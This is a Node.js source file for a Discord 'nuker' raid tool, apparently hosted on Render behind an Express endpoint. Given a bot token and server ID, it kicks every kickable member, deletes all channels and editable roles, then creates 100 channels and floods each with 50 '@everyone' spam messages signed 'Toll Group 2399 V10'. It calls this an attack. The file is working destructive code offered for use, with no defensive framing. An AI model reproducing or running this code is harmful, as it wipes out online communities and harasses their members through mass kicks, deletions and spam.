const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Partials } = require('discord.js');
const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());
app.use(require('cors')());

// لضمان بقاء السيرفر حياً على Render
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/keepalive', (req, res) => res.send("System Online"));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;

    // إعداد البوت بأقصى طاقة (V10 Engine)
    const client = new Client({ 
        intents: [3276799],
        partials: [Partials.Message, Partials.Channel, Partials.GuildMember]
    });

    try {
        // محاولة تسجيل دخول سريعة
        await client.login(token);
        
        client.once('ready', async () => {
            console.log(`[+] Logged in as: ${client.user.tag}`);
            const guild = await client.guilds.fetch(guildId).catch(() => null);
            
            if (!guild) {
                client.destroy();
                return res.status(404).json({ status: '❌ البوت شغال بس مو بالسيرفر!' });
            }

            // تنفيذ المهمة فوراً
            runV10(guild, action, customName, customMsg);
            res.json({ status: '🚀 V10 PRO: الهجوم بدأ بنجاح!' });
        });

    } catch (err) {
        console.error("Login Error:", err.message);
        res.status(500).json({ status: `❌ فشل التوكن: ${err.message}` });
    }
});

async function runV10(guild, action, name, msg) {
    const finalName = name || "Toll Group 2399 V10";
    const finalMsg = msg || "@everyone # TOLL GROUP 2399 V10 ON TOP";

    if (action === 'تدمير' || action === 'طرد') {
        const members = await guild.members.fetch();
        members.forEach(m => { if(m.kickable) m.kick('V10 Force').catch(() => {}); });
    }

    if (action === 'تدمير') {
        // حذف سريع
        guild.channels.cache.forEach(c => c.delete().catch(() => {}));
        guild.roles.cache.forEach(r => { if(r.editable) r.delete().catch(() => {}); });

        // فيضان الرومات
        for (let i = 0; i < 100; i++) {
            setTimeout(async () => {
                const ch = await guild.channels.create({ name: finalName, type: ChannelType.GuildText }).catch(() => null);
                if (ch) {
                    for(let j=0; j<50; j++) ch.send(finalMsg).catch(() => {});
                }
            }, i * 20);
        }
    }
}

app.listen(process.env.PORT || 3000, '0.0.0.0');
